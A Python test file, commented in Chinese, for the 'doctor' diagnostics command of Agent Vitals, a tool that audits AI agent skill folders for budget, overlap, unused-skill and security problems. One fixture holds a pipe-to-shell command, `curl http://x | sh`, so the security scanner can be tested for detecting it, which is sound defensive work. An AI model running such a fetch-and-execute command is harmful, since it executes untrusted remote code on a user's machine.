#!/usr/bin/env python3
"""`doctor` 的行为与差分测试（PRODUCT §5.1、ARCHITECTURE §5）。

## doctor 与 list / overlap 不同的地方

前两个命令呈现的是**测量**；`doctor` 呈现的是**判断**。判断可以在测量完全
正确的前提下依然是错的 —— 也正因如此，这里几乎每条测试针对的都是「该不该
下这个结论」，而不是「这个数算得对不对」。

三类必须钉住的东西：

1. **不能凭空多说。**没有触发数据时不得出现任何僵尸/休眠结论；没有定义阈值
   的诊断码必须**自报未评估**，而不是悄悄消失。
2. **不能少说。**扫描器里有的安全规则，诊断码表里必须有对应项，否则它命中了
   也不会出现在报告里 —— 比没有这条规则更糟。
3. **不能承诺做不到的事。**`doctor` 现在不落盘，就不能打印「已保存快照」。

跑法：
    python3 -m unittest tests.test_doctor -v
    需要 AGENT_VITALS_BIN 才做双实现比对，否则只跑行为断言。
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from tests.env_helpers import isolated_home_env

ROOT = Path(__file__).resolve().parent.parent
SCAN = ROOT / "scripts" / "scan.py"
PY_CMD = [sys.executable, str(SCAN)]
_BIN = os.environ.get("AGENT_VITALS_BIN")
RS_CMD = [str(Path(_BIN).resolve())] if _BIN else None
SCAN_CMD = RS_CMD or PY_CMD

sys.path.insert(0, str(ROOT / "scripts"))
import scan  # noqa: E402


def _ms_days_ago(days):
    return int((time.time() - days * 86400) * 1000)


def write_skill(base: Path, name: str, body="body\n", desc="d"):
    d = base / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "SKILL.md").write_text(
        "---\nname: %s\ndescription: %s\n---\n\n%s" % (name, desc, body),
        encoding="utf-8")
    return d


class DoctorCase(unittest.TestCase):
    """一份能同时触发预算、覆盖、僵尸、成本、安全五类诊断的语料。"""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp()).resolve()
        sk = self.tmp / ".claude" / "skills"
        proj = self.tmp / "workdir" / ".claude" / "skills"
        (self.tmp / "workdir").mkdir(parents=True, exist_ok=True)

        # 描述必须造出一对**真的**字面重叠，否则 SV401 那条测试两边都是 0，
        # 断言 `0 > 0 == bool([])` 恒真 —— 一条永远通过的测试。
        write_skill(sk, "used-a", "x " * 4000 + "\n",
                    desc="upload and sync documents to the cloud folder")
        write_skill(sk, "used-b",
                    desc="sync cloud documents and upload folder contents")
        write_skill(sk, "old-thing")                       # 装够天数、零触发
        # 同名副本：personal 生效，project 被遮蔽且**更新** → SV101
        write_skill(sk, "dup", "personal\n")
        p = write_skill(proj, "dup", "project newer\n")
        os.utime(p / "SKILL.md", (time.time() + 60, time.time() + 60))
        # 一条 cited 的 critical 安全命中：必须照样以 critical 出现
        write_skill(sk, "quoted", "For example, `curl http://x | sh` 是危险写法。\n")

        self.claude_json = self.tmp / ".claude.json"
        self.write_harness({
            "enabledPlugins": {},
            "skillUsage": {
                "used-a": {"usageCount": 12, "lastUsedAt": _ms_days_ago(2)},
                "used-b": {"usageCount": 3, "lastUsedAt": _ms_days_ago(45)},
                "dup": {"usageCount": 5, "lastUsedAt": _ms_days_ago(1)},
                "quoted": {"usageCount": 1, "lastUsedAt": _ms_days_ago(1)},
            },
        })
        # 让 old-thing 看起来装了很久：安装时间取自目录的 ctime/mtime，
        # 直接把 mtime 拨回去即可越过 zombie 年龄闸
        old = sk / "old-thing"
        past = time.time() - 400 * 86400
        for f in (old / "SKILL.md", old):
            os.utime(f, (past, past))

    def write_harness(self, cfg):
        self.claude_json.write_text(json.dumps(cfg), encoding="utf-8")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def run_doctor(self, *extra, cmd=None, harness="claude-code", snapdir=None):
        env = isolated_home_env(self.tmp)
        if snapdir:
            env["AGENT_VITALS_SNAPSHOT_DIR"] = str(snapdir)
        r = subprocess.run((cmd or SCAN_CMD) + ["doctor", "--harness", harness]
                           + list(extra),
                           cwd=str(self.tmp / "workdir"), env=env,
                           capture_output=True, text=True)
        # **0 与 1 都是正常的。**CI 闸门落地后，退出码 1 表示「有达到阈值的
        # 发现」—— 本类的语料刻意带着一条 critical，所以多数用例会拿到 1。
        # 但 2 永远不正常：那是工具自身出错（ARCHITECTURE §6.2）。
        # 断言写成 `!= 2` 而不是「随便什么码」，是为了让崩溃仍然会被抓住。
        self.assertNotEqual(r.returncode, 2,
                            "工具自身出错：\n%s" % (r.stderr or r.stdout))
        self.assertIn(r.returncode, (0, 1), r.stderr or r.stdout)
        return r.stdout

    def diagnostics(self, *extra, harness="claude-code"):
        out = self.tmp / "diag.json"
        self.run_doctor("--json", str(out), *extra, harness=harness)
        return json.loads(out.read_text(encoding="utf-8"))


class TestRunMarkerProvesTheScanHappened(DoctorCase):
    """`run` 标记防的不是算错，是**根本没跑就凭上次的印象写报告**。

    数值幻觉在本工具里已被结构性消灭 —— token 数、预算、冲突分类只以扫描
    输出的形式存在，Agent 没有可算的原料。剩下的风险是它压根不跑扫描。
    这 8 位由本次扫描的全部内容决定，编不出来。
    """

    def test_marker_is_on_the_header_line(self):
        out = self.run_doctor("--no-snapshot")
        self.assertTrue(out.startswith("Agent Vitals "), out[:80])
        self.assertRegex(out.splitlines()[0], r"· run [0-9a-f]{8}$")

    def test_same_state_gives_the_same_marker(self):
        """不确定的标记等于没有标记 —— 没法用来核对任何事。"""
        first = self.run_doctor("--no-snapshot").splitlines()[0]
        second = self.run_doctor("--no-snapshot").splitlines()[0]
        self.assertEqual(first, second)

    def test_marker_changes_when_the_library_changes(self):
        """对照组：确认它**真的**跟着内容走，而不是个常量。"""
        before = self.run_doctor("--no-snapshot").splitlines()[0]
        write_skill(self.tmp / ".claude" / "skills", "newcomer",
                    desc="a skill that was not there a moment ago")
        after = self.run_doctor("--no-snapshot").splitlines()[0]
        self.assertNotEqual(before, after)

    def test_marker_stays_out_of_the_scan_schema(self):
        """**这条是这组测试存在的主要理由。**

        标记进了 scan JSON 就是 schema 变更，11 份 golden 会全部失效，而
        CLAUDE.md 警告过反射性 `--update` 会让 golden 退化成「当前行为的
        记录」。所以它只在渲染时算。
        """
        target = self.tmp / "raw.json"
        self.run_doctor("--json", str(target), "--no-snapshot")
        doc = json.loads(target.read_text(encoding="utf-8"))
        # doctor 自己的 JSON 带 run —— 那是它的输出，不是 scan schema
        self.assertRegex(doc["run"], r"^[0-9a-f]{8}$")

        env = isolated_home_env(self.tmp)
        scan = subprocess.run(SCAN_CMD + ["--harness", "claude-code", "--json", "-"],
                              cwd=str(self.tmp / "workdir"), env=env,
                              capture_output=True, text=True)
        self.assertEqual(scan.returncode, 0, scan.stderr)
        report = json.loads(scan.stdout)
        self.assertNotIn("run", report)


class TestEverySecurityRuleHasACode(unittest.TestCase):
    """扫描器有、诊断码表没有的规则，会命中却不出现在报告里。

    这比没有这条规则更糟：用户看到一份「没有 pipe_to_shell」的报告，而
    scan.py 明明匹配上了。这里的断言是**全覆盖**，加规则时必须同时加码。
    """

    def test_codes_cover_every_pattern(self):
        rules = {name for name, _, _ in scan.SECURITY_PATTERNS}
        mapped = set(scan.SECURITY_CODES)
        self.assertEqual(rules - mapped, set(),
                         "这些安全规则没有诊断码，命中后会在 doctor 里静默消失")
        self.assertEqual(mapped - rules, set(),
                         "这些诊断码没有对应规则，永远不会触发")

    def test_codes_are_unique(self):
        codes = [c for c, _ in scan.SECURITY_CODES.values()]
        self.assertEqual(len(codes), len(set(codes)), "诊断码撞号：%r" % codes)


class TestNullIsNotZero(DoctorCase):
    """没有触发数据时，不得产出任何使用类结论（不变量 12、ARCHITECTURE §3.1）。

    ## 为什么用 `--harness all` 而不是「删掉 skillUsage」

    删掉 skillUsage 测不出这条。扫描器那边 `trigger_scope = loaded if
    trigger_available else []`，僵尸名单本来就是空的 —— 于是 doctor 里那道闸
    被上游挡住了，摘掉它测试照样绿。**一条被另一套机制保护着的测试，测的不是
    它声称的东西。**（这是本仓库第三次栽在同一个坑上，前两次见
    test_render 的 `test_joined_phrase_must_exist_on_both_sides`。）

    `--harness all` 才是真正会出事的组合：`read_harness_config()` 无条件读
    `~/.claude.json`，所以每个 skill 都**带着真实的 usage_count**，但
    `trigger_data.available` 是 false（那份预算与触发口径只对 claude-code
    成立）。此时若没有 doctor 里的闸，报告会一边声明「触发数据未获取」，
    一边照着 usage_count 判僵尸 —— 自相矛盾，且判据来自一个它刚说自己
    没有的东西。
    """

    def test_no_usage_diagnostics_when_trigger_data_is_unavailable(self):
        d = self.diagnostics(harness="all")
        avail = [x for x in d["diagnostics"] if x["code"] == "SV901"]
        self.assertTrue(avail, "触发数据不可用却没报 SV901")
        self.assertIn("trigger data", avail[0]["evidence"]["unavailable"])
        codes = {x["code"] for x in d["diagnostics"]}
        for c in ("SV201", "SV202", "SV303"):
            self.assertNotIn(c, codes,
                             "报告声明触发数据未获取，却又用它下了 %s" % c)

    def test_the_raw_data_really_is_there(self):
        """确认上面那条测的是闸，不是「本来就没有数据」。

        `--harness all` 下每个 skill 仍带真实 usage_count；挡住结论的必须是
        doctor 自己那道闸。
        """
        env = isolated_home_env(self.tmp)
        raw = self.tmp / "all.json"
        subprocess.run(SCAN_CMD + ["--harness", "all", "--json", str(raw)],
                       cwd=str(self.tmp / "workdir"), env=env,
                       capture_output=True, text=True, check=True)
        doc = json.loads(raw.read_text(encoding="utf-8"))
        self.assertFalse(doc["trigger_data"]["available"])
        self.assertTrue(any(s.get("usage_count") for s in doc["skills"]),
                        "语料里没有任何非零 usage_count，这条测试是空转的")

    def test_zero_trigger_is_reported_when_data_exists(self):
        """对照组：同一份语料，执行环境给得出触发数据时必须报出 SV201。

        没有这一半，上面两条可以靠「SV201 根本没实现」一起通过。
        """
        codes = {d["code"] for d in self.diagnostics("--zombie-age", "0")["diagnostics"]}
        self.assertIn("SV201", codes)


class TestSecurityHeuristicIsNotAVerdict(DoctorCase):
    """cited 只影响排序，不得降级、不得抑制（同 test_regressions 的三条）。"""

    def test_cited_critical_still_lands_in_critical(self):
        ds = self.diagnostics()["diagnostics"]
        sv = [d for d in ds if d["code"] == "SV502"]
        self.assertTrue(sv, "cited 的 pipe_to_shell 被整条吞掉了")
        self.assertEqual(sv[0]["severity"], "critical",
                         "命中处在引用语境里，严重度也不能降")
        self.assertTrue(any(h["cited"] for h in sv[0]["evidence"]["hits"]),
                        "语料没按预期造出 cited 命中，这条测试没在测它以为的东西")

    def test_report_never_says_a_skill_is_safe(self):
        out = self.run_doctor()
        for phrase in ("是安全的", "没有风险", "safe to use"):
            self.assertNotIn(phrase, out)
        self.assertIn("no match does not prove safety", out)


class TestRenderDisciplines(DoctorCase):
    """PRODUCT §5.1 的三条渲染纪律。"""

    def test_budget_and_context_are_separate_sections(self):
        """纪律 1：预算是 chars，启动上下文是 tokens，混在一起会被读成
        「上下文用掉 91%」。"""
        out = self.run_doctor()
        lines = out.splitlines()
        bi = lines.index("Description budget")
        ci = lines.index("Startup context (tier1)")
        self.assertNotEqual(bi, ci)
        self.assertIn("chars", lines[bi + 1])
        self.assertNotIn("chars", lines[ci + 1])
        self.assertIn("tokens", lines[ci + 1])
        self.assertNotIn("tokens", lines[bi + 1])

    def test_budget_number_always_carries_the_builtin_caveat(self):
        """纪律 2：省掉这条 caveat，结论会从高估翻转成低估。"""
        out = self.run_doctor()
        bi = out.splitlines().index("Description budget")
        window = "\n".join(out.splitlines()[bi:bi + 5])
        self.assertIn("built-in skills", window,
                      "预算数字必须与「不含内置 skill」同屏出现")

    def test_under_budget_is_not_rendered_as_a_problem(self):
        """纪律 3：没超就正常报一句百分比，不进 CRITICAL/WARNING。"""
        out = self.run_doctor()
        codes = {d["code"] for d in self.diagnostics()["diagnostics"]}
        self.assertNotIn("SV002", codes)
        self.assertNotIn("SV001", codes)
        self.assertIn("Description budget", out)          # 但百分比照常显示
        self.assertIn("%", out)

    def test_over_budget_becomes_critical(self):
        """对照组：把预算压到 1 字符，SV002 必须出现且是 critical。"""
        ds = self.diagnostics("--budget", "1")["diagnostics"]
        sv = [d for d in ds if d["code"] == "SV002"]
        self.assertTrue(sv, "预算已溢出却没报 SV002")
        self.assertEqual(sv[0]["severity"], "critical")
        self.assertTrue(sv[0]["caveats"], "带系统性偏差的诊断必须带 caveats")


class TestCaveatsAreMandatory(DoctorCase):
    """ARCHITECTURE §5.1：`caveats` 是必填数组。

    偏差写在文档里不算数 —— 必须与结论同屏。
    """

    def test_every_diagnostic_has_the_required_shape(self):
        for d in self.diagnostics()["diagnostics"]:
            for key in ("code", "name", "severity", "skill", "evidence",
                        "impact", "recommendation", "caveats"):
                self.assertIn(key, d, "%s 缺字段 %s" % (d.get("code"), key))
            self.assertIsInstance(d["caveats"], list, d["code"])
            self.assertIn(d["severity"], ("critical", "warning", "info"), d["code"])


class TestNotAssessedIsVisible(DoctorCase):
    """缺一列的报告有价值，编一列的没有 —— 前提是**缺的那一列自报家门**。"""

    def test_unassessed_codes_and_reasons_are_printed(self):
        out = self.run_doctor()
        self.assertIn("Not assessed", out)
        for code, name, _ in scan.NOT_ASSESSED:
            self.assertIn(code, out, "%s 未评估却没说" % code)
            self.assertIn(name, out)

    def test_json_carries_them_too(self):
        got = {x["code"] for x in self.diagnostics()["not_assessed"]}
        self.assertEqual(got, {c for c, _, _ in scan.NOT_ASSESSED})
        for x in self.diagnostics()["not_assessed"]:
            self.assertTrue(x["reason"].strip(), "%s 没说为什么不评估" % x["code"])


class TestChangesSectionComesFirst(DoctorCase):
    """变化段在结论**之前**（PRODUCT §5.1）。这是 diff 进入用户路径的方式。

    ## 这个类原来叫 TestDoctorPromisesNothingItCannotDo

    它当初钉的是「doctor 不落任何文件、也不打印『已保存快照』」—— 那不是一条
    永恒的不变量，而是一个**有前提的决定**：快照与 diff 当时排在 P0.5，还没
    实现，打那句话就是承诺工具做不到的事。

    P0.5 落地后前提没了，doctor 会自动存快照，那句话也就诚实了。**但纪律没
    变，只是换了形式**：doctor 仍然只能说它真做过的事 —— 写失败就不能说写成功。
    这条现在由 `tests/test_snapshot.py::TestDoctorOnlyClaimsWhatItDid` 钉着，
    包括只读目录下的失败路径。

    留在这里的是这个类里唯一与快照无关、且仍然成立的那条。
    """

    def test_baseline_renders_changes_before_the_conclusions(self):
        base = self.tmp / "before.json"
        env = isolated_home_env(self.tmp)
        subprocess.run(SCAN_CMD + ["--harness", "claude-code", "--json", str(base)],
                       cwd=str(self.tmp / "workdir"), env=env,
                       capture_output=True, text=True, check=True)
        out = self.run_doctor("--baseline", str(base))
        lines = out.splitlines()
        ci = next(i for i, l in enumerate(lines) if l.startswith("Changes since"))
        vi = next(i for i, l in enumerate(lines) if l.startswith(("CRITICAL", "WARNING")))
        self.assertLess(ci, vi, "变化段必须在结论之前")


class TestOneThresholdOneAnswer(DoctorCase):
    """`doctor` 的 SV401 与 `overlap` 必须用同一个阈值。

    否则同一份数据上，doctor 说 3 对、overlap 列出 5 对 —— 两条命令互相
    否证，用户无从判断该信哪个。
    """

    def test_sv401_count_matches_overlap(self):
        env = isolated_home_env(self.tmp)
        raw = self.tmp / "scan.json"
        subprocess.run(SCAN_CMD + ["--harness", "claude-code", "--json", str(raw)],
                       cwd=str(self.tmp / "workdir"), env=env,
                       capture_output=True, text=True, check=True)
        pairs = self.tmp / "pairs.json"
        subprocess.run(SCAN_CMD + ["overlap", "--harness", "claude-code",
                                   "--json", str(pairs)],
                       cwd=str(self.tmp / "workdir"), env=env,
                       capture_output=True, text=True, check=True)
        n = len(json.loads(pairs.read_text(encoding="utf-8")))
        self.assertGreater(n, 0, "语料没造出任何重叠对，这条测试是空转的")
        ds = [d for d in self.diagnostics()["diagnostics"] if d["code"] == "SV401"]
        self.assertTrue(ds, "overlap 报了 %d 对，doctor 一条 SV401 都没有" % n)
        self.assertEqual(ds[0]["evidence"]["count"], n,
                         "两条命令在同一份数据上给出了不同的对数")


class TestShadowedNewerIsCritical(DoctorCase):
    """你改的那份没生效 —— 这是**已经在造成损害**，不是「供参考」。"""

    def test_sv101_severity(self):
        ds = self.diagnostics()["diagnostics"]
        sv = [d for d in ds if d["code"] == "SV101"]
        self.assertTrue(sv, "project 副本更新却没报 SV101")
        self.assertEqual(sv[0]["severity"], "critical")


class TestUnreadableSkillsSurface(DoctorCase):
    """读不了的 skill 必须出现在诊断里 —— 它直接影响上面每个统计的分母。"""

    def test_sv902(self):
        bad = self.tmp / ".claude" / "skills" / "broken"
        bad.mkdir(parents=True, exist_ok=True)
        (bad / "SKILL.md").write_bytes(b"---\nname: broken\n")
        try:
            os.chmod(bad / "SKILL.md", 0o000)
        except OSError:
            self.skipTest("本文件系统不支持 chmod")
        if os.access(bad / "SKILL.md", os.R_OK):
            self.skipTest("以 root 运行，chmod 000 无效")
        try:
            codes = {d["code"] for d in self.diagnostics()["diagnostics"]}
            self.assertIn("SV902", codes)
        finally:
            os.chmod(bad / "SKILL.md", 0o644)


class TestWrapKeepsTextReadable(unittest.TestCase):
    """折行按显示列宽算，且闭引号不落行首。"""

    def test_cjk_counts_two_columns(self):
        self.assertEqual(scan._cols("中文"), 4)
        self.assertEqual(scan._cols("ab"), 2)
        self.assertEqual(scan._cols("中a"), 3)

    def test_lines_fit_the_width(self):
        text = "这是一段很长的中文说明，" * 12
        for line in scan._wrap(text, "  ! "):
            self.assertLessEqual(scan._cols(line), scan.DOCTOR_WIDTH + 2)

    def test_english_words_are_not_split(self):
        text = "run agent-vitals overlap " * 12
        joined = " ".join(l.strip() for l in scan._wrap(text, "  → "))
        self.assertNotIn("skill-vital s", joined)
        self.assertIn("agent-vitals", joined)

    def test_closing_bracket_never_starts_a_line(self):
        # 「禁则处理」：一行以 」或。开头，读起来像上一行被截断了
        text = "前面填充" * 20 + "说「便宜了」时必须指明是哪个数降了。"
        for line in scan._wrap(text, "  ! "):
            self.assertNotIn(line.strip()[:1], scan._NO_LINE_START)


class TestBareInvocationIsDoctor(DoctorCase):
    """`agent-vitals` 无参数等价于 `doctor`（PRODUCT §5 第一行、§183）。

    第一次用的人想知道的是「我的 Agent 到底有没有问题」，不该先学 CLI。

    但判据必须是**有没有给 `--json`**，不是「有没有子命令」：SKILL.md 与
    全部集成测试都靠 `--json <file>` 取原始 JSON，把扫描降级成子命令会
    一次性打断所有调用方。原来的裸调用（JSON 打到 stdout）改用 `--json -`。
    """

    def _run(self, *argv):
        env = isolated_home_env(self.tmp)
        r = subprocess.run(SCAN_CMD + list(argv),
                           cwd=str(self.tmp / "workdir"), env=env,
                           capture_output=True, text=True)
        # 同 run_doctor：0/1 都正常，2 是工具自身出错
        self.assertIn(r.returncode, (0, 1), r.stderr or r.stdout)
        return r.stdout

    def test_no_args_renders_the_doctor_report(self):
        out = self._run("--harness", "claude-code")
        self.assertTrue(out.startswith("Agent Vitals "), out[:80])
        self.assertIn("Startup context (tier1)", out)
        self.assertNotIn('"schema_version"', out)

    def test_json_file_still_gets_raw_json(self):
        """SKILL.md 走的就是这条路径 —— 改动不得波及它。"""
        target = self.tmp / "raw.json"
        self._run("--harness", "claude-code", "--json", str(target))
        doc = json.loads(target.read_text(encoding="utf-8"))
        self.assertIn("schema_version", doc)
        self.assertIn("skills", doc)

    def test_dash_sends_json_to_stdout(self):
        out = self._run("--harness", "claude-code", "--json", "-")
        self.assertIn("schema_version", json.loads(out))


@unittest.skipUnless(RS_CMD, "未设 AGENT_VITALS_BIN，跳过双实现比对")
class TestBothImplementationsRenderIdentically(DoctorCase):
    """呈现层也在差分覆盖内 —— 用户看到的是这份报告，不是 JSON。"""

    def test_identical(self):
        # **必须带 --no-snapshot。**doctor 每跑一次就写一份快照，文件名带秒级
        # 时间戳加同秒序号；两个实现先后跑，序号必然不同，报告末行因此永远
        # 不一致。那不是实现差异，是测试自己制造的噪声。
        # 快照那几行由下面 test_snapshot_lines_match 单独比（掩掉路径）。
        for extra in ([], ["--budget", "1"], ["--min", "0.1"]):
            with self.subTest(extra=extra):
                self.assertEqual(self.run_doctor(*extra, "--no-snapshot", cmd=PY_CMD),
                                 self.run_doctor(*extra, "--no-snapshot", cmd=RS_CMD))

    def test_snapshot_lines_match(self):
        """开着快照时，除了那个必然不同的文件名，其余每一行也要一致。"""
        import re
        # **各自一个快照目录。**共用的话，后跑的那个会看见先跑的那份，于是多
        # 出一整段 Changes —— 又是测试自己制造的差异。
        mask = lambda t: re.sub(r"[/\\]snap-(py|rs)[/\\]\S+\.json",
                                "/snap/<stamp>.json", t)
        py = mask(self.run_doctor(cmd=PY_CMD, snapdir=self.tmp / "snap-py"))
        rs = mask(self.run_doctor(cmd=RS_CMD, snapdir=self.tmp / "snap-rs"))
        self.assertEqual(py, rs)
        self.assertIn("✓ Snapshot saved", py, "掩码之后别把整段快照提示也掩没了")


class TestDoctorJsonPayload(DoctorCase):
    """`doctor --json` 载荷契约：`-` 写 stdout、`--with-report` 并入报告本体。

    这条取数路径是桌面工作台「Skill 体检」tab 的唯一来源（WORKBENCH_SKILL_
    HEALTH_TAB_SPEC §5.1）：tab 一次扫描要同时拿到 SV 码（diagnostics）与
    harness_summaries（report），分两次调用就要扫两遍。形状改动由双实现差分
    钉死，桌面端的 fixture 再从真实输出捕获。
    """

    def _payload(self, *extra, cmd=None):
        out = self.run_doctor("--json", "-", "--no-snapshot", *extra, cmd=cmd)
        # `doctor --json -` 走的是「不落盘」路径：退出码 0/1 已由 run_doctor 把关
        return json.loads(out)

    def test_dash_writes_json_to_stdout(self):
        """`doctor --json -` 与主扫描 `--json -` 同语义：stdout 是 JSON 管道。"""
        payload = self._payload("--budget", "1")
        self.assertIn("schema_version", payload)
        self.assertIn("diagnostics", payload)
        codes = {d["code"] for d in payload["diagnostics"]}
        self.assertIn("SV002", codes, "语料压到 --budget 1，诊断列表必须有预算溢出")
        # `-` 是 stdout 标记，不是文件名：不许在磁盘上留下一个叫 "-" 的垃圾文件
        self.assertFalse((self.tmp / "workdir" / "-").exists(),
                         "doctor --json - 不应该创建名为 '-' 的文件")

    def test_with_report_attaches_scan_document(self):
        payload = self._payload("--with-report")
        report = payload.get("report")
        self.assertIsInstance(report, dict, "with-report 必须带 report 本体")
        # report 是完整扫描文档，不是摘要：诊断消费方要的 harness_summaries /
        # description_budget / skills 都在里面（run 不在文档里 —— 它由 run_id()
        # 从内容派生，载荷顶层的 run 才是权威）
        for key in ("harness_summaries", "skills", "description_budget",
                    "cross_harness_note"):
            self.assertIn(key, report)
        # 无 --with-report 时不带 report（载荷保持最小）
        self.assertNotIn("report", self._payload())

    @unittest.skipUnless(RS_CMD, "未设 AGENT_VITALS_BIN，跳过双实现比对")
    def test_json_payload_identical_across_implementations(self):
        """`doctor --json - --with-report` 载荷逐字节一致（含 report 本体）。"""
        extra = ["--with-report", "--no-snapshot"]
        py = self.run_doctor("--json", "-", *extra, cmd=PY_CMD)
        rs = self.run_doctor("--json", "-", *extra, cmd=RS_CMD)
        self.assertEqual(py, rs)
        # 两个实现产出的都真是「带报告的载荷」
        for text in (py, rs):
            payload = json.loads(text)
            self.assertIn("report", payload)
            self.assertIn("harness_summaries", payload["report"])
